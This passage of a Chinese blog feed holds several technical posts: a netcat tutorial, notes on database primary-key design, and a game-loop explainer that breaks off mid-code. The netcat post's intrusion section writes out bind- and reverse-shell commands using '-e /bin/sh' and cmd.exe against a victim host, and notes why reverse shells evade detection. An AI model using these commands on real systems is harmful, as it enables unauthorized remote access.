href="https://developer.mozilla.org/en-US/docs/Web/API/TextDecoder" target="_blank" rel="noopener">TextDecoder</a>,by mozilla.</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/fromCharCode" target="_blank" rel="noopener">String.fromCharCode()</a>,by mozilla.</li><li><a href="https://javascript.ruanyifeng.com/stdlib/arraybuffer.html" target="_blank" rel="noopener">二进制数组</a>,by 阮一峰.</li><li><a href="http://es6.ruanyifeng.com/#docs/arraybuffer" target="_blank" rel="noopener">ArrayBuffer</a>,by 阮一峰.</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近遇到一个问题，拿到一个ArrayBuffer，知道它是以gb2312编码的文档，那么如何使用javascript从中解码出字符串。下面介绍常用的解决方案。&lt;/p&gt;
&lt;h1 id=&quot;基础知识&quot;&gt;&lt;a href=&quot;#基础知识&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
    
      <category term="笔记本" scheme="https://huangwang.github.io/tags/%E7%AC%94%E8%AE%B0%E6%9C%AC/"/>
    
      <category term="前端" scheme="https://huangwang.github.io/tags/%E5%89%8D%E7%AB%AF/"/>
    
      <category term="JavaScript" scheme="https://huangwang.github.io/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>netcat使用方法简介</title>
    <link href="https://huangwang.github.io/2019/09/22/netcat%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E7%AE%80%E4%BB%8B/"/>
    <id>https://huangwang.github.io/2019/09/22/netcat使用方法简介/</id>
    <published>2019-09-21T20:41:05.000Z</published>
    <updated>2019-09-21T21:34:46.776Z</updated>
    
    <content type="html"><![CDATA[<p>netcat（通常缩写为nc）是一种计算机联网实用程序，用于使用TCP或UDP读写网络连接。 该命令被设计为可靠的后端，可以直接使用或由其他程序和脚本轻松驱动。 同时，它是功能丰富的网络调试和调查工具，因为它可以产生用户可能需要的几乎任何类型的连接，并具有许多内置功能。netcat被称为网络工具中的瑞士军刀，体积小巧，但功能强大。</p><h1 id="使用帮助"><a href="#使用帮助" class="headerlink" title="使用帮助"></a>使用帮助</h1><div class="table-container"><table><thead><tr><th>选项</th><th>是否有“选项值”</th><th>说明</th></tr></thead><tbody><tr><td>h</td><td>NO</td><td>输出 nc 的帮助</td></tr><tr><td>v</td><td>NO</td><td>在网络通讯时，显示详细的输出信息。注：建议新手多用该选项，出错时帮你诊断问题</td></tr><tr><td>n</td><td>NO</td><td>对命令行中的“主机”，【不】进行域名解析。注：如果“主机”是“点分格式”的 IP 地址，需要用该选项；如果“主机”是“域名”形式，【不能】用该选项</td></tr><tr><td>p</td><td>YES</td><td>指定“端口号”</td></tr><tr><td>l</td><td>NO</td><td>开启“监听模式”，nc 作为【服务端】。注：如不加该选项，nc 默认作为客户端</td></tr><tr><td>u</td><td>NO</td><td>使用 UDP 协议。注：如不加该选项，默认是 TCP 协议</td></tr><tr><td>w</td><td>YES</td><td>设置连接的超时间隔（N 秒）</td></tr><tr><td>q</td><td>YES</td><td>让 nc 延时（N 秒）再退出</td></tr><tr><td>z</td><td>NO</td><td>开启“zero-I/O 模式”。注：该选项仅用于“端口扫描”，后面会聊到</td></tr><tr><td>k</td><td>NO</td><td>配合 -l 选项使用，可以重复接受客户端连接。注：“原版 nc”的该选项用来开启“TCP keepalive”。这是“原版 nc”与“OpenBSD 变种”之间的差异之一</td></tr><tr><td>X</td><td>YES</td><td>指定代理的类型（具体用法，后面会聊到）。注：“原版 nc”【没有】该选项。这是“原版 nc”与“OpenBSD 变种”之间的差异之一</td></tr><tr><td>x</td><td>YES</td><td>以 IP:port 的格式指定代理的位置。注：“原版 nc”【没有】该选项。这是“原版 nc”与“OpenBSD 变种”之间的差异之一</td></tr><tr><td>e</td><td>YES</td><td>启动某个进程，把该进程的“标准输入输出”与网络通讯【对接】。注：通常用该选项开启一个网络后门。“OpenBSD 变种”基于安全考虑，已去掉该选项，但还是能用间接的方式达到同样的效果。</td></tr></tbody></table></div><h1 id="典型示例"><a href="#典型示例" class="headerlink" title="典型示例"></a>典型示例</h1><h2 id="网络诊断"><a href="#网络诊断" class="headerlink" title="网络诊断"></a>网络诊断</h2><h3 id="测试某个远程主机的【监听】端口是否可达"><a href="#测试某个远程主机的【监听】端口是否可达" class="headerlink" title="测试某个远程主机的【监听】端口是否可达"></a>测试某个远程主机的【监听】端口是否可达</h3><p>用如下命令可以测试某个 IP 地址（x.x.x.x）上的某个监听端口（xx）是否开启。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -nv x.x.x.x xx</span><br><span class="line">nc -nv -w 3 x.x.x.x xx</span><br></pre></td></tr></table></figure><p>上述命令用到了如下几个选项：</p><ul><li>选项 -v</li></ul><p>如果你是 nc 的新手，建议总是带上这个选项——通过更详细的输出，能帮你搞明白状况。</p><ul><li>选项 -n</li></ul><p>由于测试的是【IP 地址】，用该选项告诉 nc，【无须】进行域名（DNS）解析；反之，如果你要测试的主机是基于【域名】，就【不能】用“选项 -n”。</p><ul><li>选项 -w</li></ul><p>在测试链接的时候，如果你【没】使用 -w 这个超时选项，默认情况下 nc 会等待很久，然后才告诉你连接失败。</p><p>如果你所处的网络环境稳定且高速（比如：局域网内），那么，你可以追加“-w 选项”，设置一个比较小的超时值。</p><h3 id="判断防火墙是否“允许-or-禁止”某个端口"><a href="#判断防火墙是否“允许-or-禁止”某个端口" class="headerlink" title="判断防火墙是否“允许 or 禁止”某个端口"></a>判断防火墙是否“允许 or 禁止”某个端口</h3><p>在“主机S”上运行 nc，让它在 8080 端口，命令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lv -p 8080</span><br></pre></td></tr></table></figure><p>然后在“主机C”上运行 nc，测试“主机S”上的 8080 端口是否可达。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nv x.x.x.x xx</span><br></pre></td></tr></table></figure><ul><li>选项 -l</li></ul><p>这个选项会让 nc 进入监听模式。</p><ul><li>选项 -p</li></ul><p>这个选项有“选项值”，也就是具体端口号。</p><ul><li>选项 -k</li></ul><p>在默认情况下，nc 开启 listen 模式充当服务端，在接受【第一次】客户端连接之后，就会把监听端口关闭。</p><p>如果你想要让 nc 始终监听模式，使之能【重复】接受客户端发起的连接，可以追加 -k 选项。</p><ul><li>选项 -u</li></ul><p>如果你要测试 UDP 协议，要记得【两边】的 nc 都要追加 -u 选项。</p><h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><h3 id="用-nc-进行“端口扫描”"><a href="#用-nc-进行“端口扫描”" class="headerlink" title="用 nc 进行“端口扫描”"></a>用 nc 进行“端口扫描”</h3><p>下面这个命令，用来扫描 IP 地址为 x.x.x.x 的主机，扫描的端口范围从 1 到 1024。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -znv x.x.x.x 1-1024</span><br><span class="line">nc -znv x.x.x.x 1-1024  2&gt;&amp;1 | grep succeeded</span><br></pre></td></tr></table></figure><ul><li>选项 -z</li></ul><p>意思是：开启“zero-I/O 模式”。该模式指的是：nc 只判断某个监听端口是否能连上，连上后【不】与对端进行数据通讯。</p><ul><li><p>选项 -n</p></li><li><p>选项 -v</p></li></ul><p>由于“-v 选项”产生的输出位于【stderr】，上述命令中的 2&gt;&amp;1 用来把【stderr】合并到【stdout】（注：这种写法只适用于 POSIX 系统上的 shell）。</p><p>grep 命令用来进行【过滤】。对于 Windows 系统，默认【没有】grep 命令，需改用 find 命令过滤。</p><h2 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h2><h3 id="基于-nc-的端口转发（Port-Forward）"><a href="#基于-nc-的端口转发（Port-Forward）" class="headerlink" title="基于 nc 的端口转发（Port Forward）"></a>基于 nc 的端口转发（Port Forward）</h3><p>用 nc 进行端口转发，需要运行【两个】nc 进程，一个充当“服务端”，另一个是“客户端”，然后用【管道】让把两个进程的“标准输入输出”交叉配对。所谓的“交叉配对”就是——每一个 nc 进程的“标准输出”都【对接】到另一个 nc 进程的“标准输入”。如此一来，就可以完美地建立【双向通讯】。</p><p>运行下面命令之后，就可以把本机的 1235 端口重定向到本机的 5678 端口。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkfifo nc_pipe</span><br><span class="line">nc -l -p 1234 &lt; nc_pipe | nc 127.0.0.1 5678 &gt; nc_pipe</span><br></pre></td></tr></table></figure></p><h2 id="系统管理"><a href="#系统管理" class="headerlink" title="系统管理"></a>系统管理</h2><h3 id="用-nc-传输文件"><a href="#用-nc-传输文件" class="headerlink" title="用 nc 传输文件"></a>用 nc 传输文件</h3><p>假设你有两台主机 A 与 B，你要把 A 主机上的文件 file1 传输到 B 主机上，保存为 file2</p><p>你先在【接收端】（B 主机）运行如下命令（其中的 xxx 是端口号）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p xxx &gt; file2</span><br></pre></td></tr></table></figure><p>然后在【发送端】（A 主机）运行如下命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc x.x.x.x xxx &lt; file1</span><br></pre></td></tr></table></figure><p>第二条命令中的 xxx 是端口号，要与第一条命令中的端口号相同；第二条命令中的 x.x.x.x 是【主机 B】的 IP 地址。</p><p>用 nc 传输文件，相当于是：直接在【裸 TCP】层面传输。你可以通俗理解为：【没有】应用层。如果你传输的文件【超级大】或者文件数量【超级多】，用 nc 传输文件的性能优势会很明显（相比“FTP、SSH、共享目录…”而言）</p><h3 id="用-nc-远程备份整个磁盘"><a href="#用-nc-远程备份整个磁盘" class="headerlink" title="用 nc 远程备份整个磁盘"></a>用 nc 远程备份整个磁盘</h3><p>你先在【接收端】（B 主机）运行如下命令（其中的 xxx 是端口号）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p xxx | dd of=/dev/sdb</span><br></pre></td></tr></table></figure><p>然后在【发送端】（A 主机）运行如下命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=/dev/sda | nc x.x.x.x xxx</span><br></pre></td></tr></table></figure><h2 id="网络入侵"><a href="#网络入侵" class="headerlink" title="网络入侵"></a>网络入侵</h2><h3 id="用-nc-开启【被动】连接型后门"><a href="#用-nc-开启【被动】连接型后门" class="headerlink" title="用 nc 开启【被动】连接型后门"></a>用 nc 开启【被动】连接型后门</h3><ul><li>在受害者机器上开启后门</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc.exe -l -p xxx -e cmd.exe</span><br><span class="line">nc -l -p xxx -e /bin/sh</span><br></pre></td></tr></table></figure><p>后门创建好之后，攻击者在自己机器上也运行 nc（客户端 nc），然后连接到作为后门的 nc（服务端 nc）。一旦连上之后，攻击者就可以在自己的 nc 上看到对方（受害者机器）的 shell 提示符。</p><ul><li>防范措施</li></ul><p>NAT 模式的虚拟机（Guest OS）</p><p>NAT 的好处在于【单向可见】。也就是说，Guest OS 可以访问到物理系统（Host OS）【外部】的网络环境；但外部网络环境只能看到 Host OS，看不到 Guest OS。</p><p>在这种配置下，就算某个入侵者完全控制了你的 Guest OS，他/她也【没】办法在 Guest OS 中搭建“被动连接型后门”。换句话说，即使入侵者运行了这种后门，（但由于 NAT 的缘故）后门【无法】接受外部网络的连接，这个后门就【失去意义】。</p><h3 id="用-nc-开启【主动】连接型后门"><a href="#用-nc-开启【主动】连接型后门" class="headerlink" title="用 nc 开启【主动】连接型后门"></a>用 nc 开启【主动】连接型后门</h3><ul><li>攻击者在自己机器上运行“服务端 nc”</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lk -p xxx</span><br><span class="line">nc.exe -e cmd.exe x.x.x.x xxx</span><br><span class="line">nc -e /bin/sh x.x.x.x xxx</span><br></pre></td></tr></table></figure><p>（在上述两个命令中， xxx 是步骤1用到的端口号，x.x.x.x 是攻击者的 IP 地址）</p><ul><li>防范措施</li></ul><p>【隔离模式】的虚拟机</p><ul><li>【主动】连接型后门的优势之处</li></ul><p>简单对比一下“后门的两种连接方式”。</p><p><strong>可用性</strong></p><p>如果用“被动型后门”入侵桌面 PC，考虑到绝大部分桌面 PC 都处于内网（其网卡【并未】分配公网 IP）。对这种场景，攻击者需要与受害者在同一个局域网，才能与后门建立通讯。相比之下，“主动型后门”就【没有】这种弊端。</p><p><strong>隐蔽性</strong></p><p>“被动型后门”需要显式开启监听端口，很容易引起用户的怀疑，或引起杀毒软件的注意。相比之下，“主动型后门”就【没有】这个问题。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://zh.wikipedia.org/wiki/Netcat" target="_blank" rel="noopener">netcat</a>,by wikipedia.</li><li><a href="https://www.jianshu.com/p/cb26a0f6c622" target="_blank" rel="noopener">NetCat使用指南</a>,by Evilwing.</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;netcat（通常缩写为nc）是一种计算机联网实用程序，用于使用TCP或UDP读写网络连接。 该命令被设计为可靠的后端，可以直接使用或由其他程序和脚本轻松驱动。 同时，它是功能丰富的网络调试和调查工具，因为它可以产生用户可能需要的几乎任何类型的连接，并具有许多内置功能。ne
      
    
    </summary>
    
    
      <category term="笔记本" scheme="https://huangwang.github.io/tags/%E7%AC%94%E8%AE%B0%E6%9C%AC/"/>
    
      <category term="计算机安全" scheme="https://huangwang.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>数据库表主键设计方法</title>
    <link href="https://huangwang.github.io/2019/09/20/%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A1%A8%E4%B8%BB%E9%94%AE%E8%AE%BE%E8%AE%A1%E6%96%B9%E6%B3%95/"/>
    <id>https://huangwang.github.io/2019/09/20/数据库表主键设计方法/</id>
    <published>2019-09-20T13:17:43.000Z</published>
    <updated>2019-09-20T14:04:05.527Z</updated>
    
    <content type="html"><![CDATA[<p>数据库表主键使用自增整型字段还是使用GUID字段，这是一个问题。下面详细分析它们的优劣。</p><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="数据库设计范式"><a href="#数据库设计范式" class="headerlink" title="数据库设计范式"></a>数据库设计范式</h2><ul><li><p>第一范式（1NF）：强调的是列的原子性，即列不能够再分成其他几列。简而言之，第一范式就是无重复的列</p></li><li><p>第二范式（2NF）：首先要满足它是1NF，另外还需要包含两部分内容：一是表必须有一个主键；二是没有包含在主键中的列必须完全依赖于主键，而不能只依赖于主键的一部分。简而言之，第二范式就是非主属性非部分依赖于主关键字</p></li><li><p>第三范式（3NF）：首先是 2NF，另外非主键列必须直接依赖于主键，不能存在传递依赖。即不能存在：非主键列 A 依赖于非主键列 B，非主键列 B 依赖于主键的情况。简而言之，第三范式（3NF）要求一个数据库表中不包含已在其它表中已包含的非主关键字信息。</p></li></ul><h2 id="反范式主键的设计原则"><a href="#反范式主键的设计原则" class="headerlink" title="反范式主键的设计原则"></a>反范式主键的设计原则</h2><ul><li>主键应当是对用户没有意义的。业务上的‘主键’可以通过唯一键（Unique Key）或唯一索引（Unique Index）和其它约束条件实现</li><li>主键应该是单列的，以便提高连接和筛选操作的效率</li><li>不要更新主键。实际上，因为主键除了惟一地标识一行之外再没有其他的用途了，所以也就没有理由去对它更新。</li><li>主键不应包含动态变化的数据，如时间戳、创建时间列、修改时间列等</li><li>主键应当由计算机自动生成。</li></ul><h1 id="数据库表主键设计方法"><a href="#数据库表主键设计方法" class="headerlink" title="数据库表主键设计方法"></a>数据库表主键设计方法</h1><p>数据库表主键设计主要有自增整型字段和使用GUID字段两种方法。</p><h2 id="自增整型字段作为主键"><a href="#自增整型字段作为主键" class="headerlink" title="自增整型字段作为主键"></a>自增整型字段作为主键</h2><p>最常用的主键设计方法。例如《阿里 Java 开发手册》中规定有以下 MySQL 建表规约：</p><blockquote><p>表必备三字段：id, gmt_create, gmt_modified。 说明：其中id必为主键，类型为unsigned bigint、单表时自增、步长为1。gmt_create, gmt_modified的类型均为date_time类型。</p></blockquote><p>该方法优点是：数据库自动编号，速度快，而且是增量增长，聚集型主键按顺序存放，对于检索非常有利;数字型的，占用空间小，易排序，在程序中传递也方便;如果通过非系统增加记录(比如手动录入，或是用其他工具直接在表里插入新记录，或老系统数据导入)时，非常方便，不用担心主键重复问题。</p><p>该方法缺点是：因为自动增长，在手动要插入指定ID的记录时会显得麻烦，尤其是当系统与其他系统集成时，需要数据导入时，很难保证原系统的ID不发生主键冲突。</p><h2 id="GUID字符串作为主键"><a href="#GUID字符串作为主键" class="headerlink" title="GUID字符串作为主键"></a>GUID字符串作为主键</h2><p>Guid:指在一台机器上生成的数字，它保证对在同一时空中的所有机器都是唯一的，其算法是通过以太网卡地址、纳秒级时间、芯片ID码和许多可能的数字生成。其格式为:04755396-9A29-4B8C-A38D-00042C1B9028。</p><p>GUID字符串作为主键的优点如下：</p><ul><li><p>在扩展数据库的时候，当你有多个数据库包含同一段（片）数据时，比如一个顾客集，使用 GUID 意味着该 ID 在所有的数据库中是唯一标识的，而不是仅仅本数据库唯一。这保障了跨数据库迁移数据的安全。又比如，我曾在项目中把多个数据库分片合并到一个 Hadoop 集群中，也没有产生键的冲突。</p></li><li><p>在插入数据之前，你就能知道这个主键的值，这避免了一轮的数据查找，并且简化了事务的逻辑，即在你插入子记录之前，因为需要使用这个主键作为一个外键，你必须要知道这个主键的值。</p></li><li><p>GUID 不会透露数据的信息，因此被用在 URL 中也比自增整数更安全。比如，我是编号 12345678 号顾客，那么人们就会猜测编号为 12345677 和 12345679 的顾客的存在，这就提供了一种攻击向量。（但是后面我们会看到一个更好的替代品）</p></li></ul><p>GUID字符串作为主键的缺点如下：</p><ul><li>GUID 值较长，不容易记忆和输入，而且这个值是随机、无顺序的。</li><li>GUID 的值有 16 个字节，与其它那些诸如 4 字节的整数相比要相对大一些。这意味着如果在数据库中使用 uniqueidentifier 键，可能会带来两方面的消极影响：存储空间增大;索引时间较慢。</li></ul><h1 id="主流数据库中GUID实现"><a href="#主流数据库中GUID实现" class="headerlink" title="主流数据库中GUID实现"></a>主流数据库中GUID实现</h1><h2 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h2><p>在MS Sql 数据库中可以在建立表结构是指定字段类型为uniqueidentifier,并且其默认值可以使用NewID()来生成唯一的Guid(全局唯一标识符).</p><p>使用NewID生成的比较随机,如果是SQL 2005可以使用NewSequentialid()来顺序生成,在此为了兼顾使用SQL 2000使用了NewID().</p><h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><p>MySQL中使用UUID()函数生成主键，UUID()函数将生成格式为xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx (8-4-4-4-12)的字符串，包含32个16进制数字，以连字号分为五段。示例：550e8400-e29b-41d4-a716-446655440000。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://blog.csdn.net/kleguan/article/details/74502330" target="_blank" rel="noopener">数据库表主键设计原则</a>,by 乐哉悠哉.</li><li><a href="https://blog.csdn.net/linzhiqiang0316/article/details/52881151" target="_blank" rel="noopener">[MySQL]数据库主键设计之思考</a>,by 林老师带你学编程.</li><li><a href="http://www.nowamagic.net/librarys/veda/detail/383" target="_blank" rel="noopener">如何设计数据库的主键</a>,by Veda 原型.</li><li><a href="https://juejin.im/post/59561e5b6fb9a06bbf6fdf16" target="_blank" rel="noopener">[译] 把 UUID 或者 GUID 作为主键？你得小心啦！</a>,by zaraguo.</li><li><a href="https://blog.csdn.net/shiyong1949/article/details/78411509" target="_blank" rel="noopener">MySQL中使用UUID()函数生成主键</a>,by shiyonghm.</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;数据库表主键使用自增整型字段还是使用GUID字段，这是一个问题。下面详细分析它们的优劣。&lt;/p&gt;
&lt;h1 id=&quot;基础知识&quot;&gt;&lt;a href=&quot;#基础知识&quot; class=&quot;headerlink&quot; title=&quot;基础知识&quot;&gt;&lt;/a&gt;基础知识&lt;/h1&gt;&lt;h2 id=&quot;数据库设计
      
    
    </summary>
    
    
      <category term="笔记本" scheme="https://huangwang.github.io/tags/%E7%AC%94%E8%AE%B0%E6%9C%AC/"/>
    
      <category term="数据库" scheme="https://huangwang.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>游戏引擎与物理引擎</title>
    <link href="https://huangwang.github.io/2019/09/16/%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E%E4%B8%8E%E7%89%A9%E7%90%86%E5%BC%95%E6%93%8E/"/>
    <id>https://huangwang.github.io/2019/09/16/游戏引擎与物理引擎/</id>
    <published>2019-09-16T13:44:49.000Z</published>
    <updated>2019-10-07T13:24:42.943Z</updated>
    
    <content type="html"><![CDATA[<p>游戏引擎提供一系列可视化开发工具和可重用组件。这些工具通过与开发环境进行集成，方便开发者简单、快速进行数据驱动方式的游戏开发。为了提高游戏开发人员的开发效率，引擎开发者会开发出大量的游戏所需要的软件组件。大多数引擎集成了图形、声音、物理和人工智能等功能部件。游戏引擎会被称为“中间件”，因为它们可以提供灵活和重用平台，向游戏开发者提供所需要的全部核心功能，从而节省大量的游戏开发费用，降低开发的复杂性，缩短游戏的上市时间，所有这些对于高竞争性的游戏产业来说都是关键因素。诸如虚幻系列引擎、Unity3D、Frostbite Engine、zerodin引擎、Doom3引擎、CryENGINE、3DGame Studio、RenderWare、Gamebryo、Virtools以及Source引擎等引擎。</p><p>物理引擎是一个计算机程序模拟牛顿力学模型，使用质量、速度、摩擦力和空气阻力等变量。可以用来预测这种不同情况下的效果。它主要用在计算物理学和电子游戏以及计算机动画当中。物理引擎可作为游戏引擎的一个组件。</p><p>物理引擎有两种类型常见的型类：实时物理引擎和高精度物理引擎。高精度的物理引擎需要更多的处理能力来计算非常精确的物理，通常使用在科学研究（计算物理学）和计算机动画电影制作。实时物理引擎使用通常使用在电子游戏并且简化运算，降低精确度增以减少计算时间，得到在电子游戏当中可以接受的的处理速度。常用的物理引擎有：ODE、Box2D、PhysX、Bullet、Havok引擎。</p><h1 id="游戏主循环"><a href="#游戏主循环" class="headerlink" title="游戏主循环"></a>游戏主循环</h1><p>FPS(Frame Per Second)游戏帧速60帧是指游戏每秒循环更新60次。  </p><p>一个游戏程序的基本结构像是这样:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">while (isRunning)</span><br><span class="line">&#123;</span><br><span class="line">updateEverything();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="固定拖时间更新法"><a href="#固定拖时间更新法" class="headerlink" title="固定拖时间更新法"></a>固定拖时间更新法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">while (isRunning)</span><br><span class="line">&#123;</span><br><span class="line">updateEverything();</span><br><span class="line">sleep(1.0/60);//程序进程等待1/60秒</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="累积时间更新法"><a href="#累积时间更新法" class="headerlink" title="累积时间更新法"></a>累积时间更新法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">/* getCurrentTime()每次调用返回当前的时间 */</span><br><span class="line">float lastUpdateTime = getCurrentTime();</span><br><span class="line">while (isRunning)</span><br><span class="line">&#123;</span><br><span class="line">float currentTime = getCurrentTime();</span><br><span class="line">float deltaTime = currentTime - lastUpdateTime;</span><br><span class="line">    /* 每调用updateEverything()后检查时间，</span><br><span class="line">     直到过去的时间达到1/60秒就进行下一次更新 */</span><br><span class="line">if (deltaTime &gt;= 1.0/60)</span><br><span class="line">&#123;</span><br><span class="line">lastUpdateTime = currentTime;</span><br><span class="line">updateEverything();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="图形更新调用法"><a href="#图形更新调用法" class="headerlink" title="图形更新调用法"></a>图形更新调用法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">while (isRunning)</span><br><span class="line">&#123;</span><br><span class="line">updateEverything();</span><br><span class="line">/* 等待垂直同步信号间的空白时间，程序执行到这里会进入等待</span><br><span class="line"> 一般会被封装在类似swapBuffer之类的图形API中执行，</span><br><span class="line"> 但是程序要开启了垂直同步的功能才有效。</span><br><span class="line"> 不过貌似现在的智能手机都默认有垂直同步的效果，</span><br><span class="line"> 当然手机和PC的硬件技术不同，可能也不叫这个名字了。*/</span><br><span class="line">waitForVerticalBlank();</span><br><span class="line">drawEverything();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="死循环并计算时间差用于更新法"><a href="#死循环并计算时间差用于更新法" class="headerlink" title="死循环并计算时间差用于更新法"></a>死循环并计算时间差用于更新法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">float lastUpdateTime = getCurrentTime();</span><br><span class="line">while (isRunning)</span><br><span class="line">&#123;</span><br><span class="line">float currentTime = getCurrentTime();</span><br><span class="line">float deltaTime = currentTime - lastUpdateTime;</span><br><span class="line">lastUpdateTime = currentTime;</span><br><span class="line">updateEverything(deltaTime);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void updateMove(float deltaTime)</span><br><span class="line">&#123;</span><br><span class="line">position.x += speedX * deltaTime;</span><br><span class="line">position.y += speedY * deltaTime;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="累积时间半固定时长等图形更新并将时间差用于更新法"><a href="#累积时间半固定时长等图形更新并将时间差用于更新法" class="headerlink" title="累积时间半固定时长等图形更新并将时间差用于更新法"></a>累积时间半固定时长等图形更新并将时间差用于更新法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">//假设目标是60帧/秒更新的游戏</span><br><span class="line">float lastUpdateTime = getCurrentTime();</span><br><span class="line">while (isRunning)</span><br><span class="line">&#123;</span><br><span class="line">float currentTime = getCurrentTime();</span><br><span class="line">float deltaTime = currentTime - lastUpdateTime;</span><br><span class="line">lastUpdateTime = currentTime;</span><br><span class="line">    /* 如果游戏太卡，过长的时间差可能会导致跳过一些不能跳过的游戏逻辑，所以做一些人为限制 */</span><br><span class="line">    if (deltaTime &gt; 1.0/30) deltaTime = 1.0/30;</span><br><span class="line">updateEverything(deltaTime);</span><br><span class="line">waitForVerticalBlank();</span><br><span class="line">drawEverything();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述方法只针对单机游戏有效，如果是网络游戏，考虑客户端之间的同步问题的话，帧速不稳定地变来变去是不好的，我们可以记录过去的时间里跑过的帧数，如果达不到目标帧数就连续进行更新直到赶上需要的帧数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">//假设目标是60帧/秒更新的游戏</span><br><span class="line">float startTime = getCurrentTime();</span><br><span class="line">long passedFrames = 0;</span><br><span class="line">while (isRunning)</span><br><span class="line">&#123;</span><br><span class="line">float currentTime = getCurrentTime();</span><br><span class="line">float totalTime = currentTime - startTime;</span><br><span class="line">long targetTotalFrames = totalTime/(1.0/60);</span><br><span class="line">/* 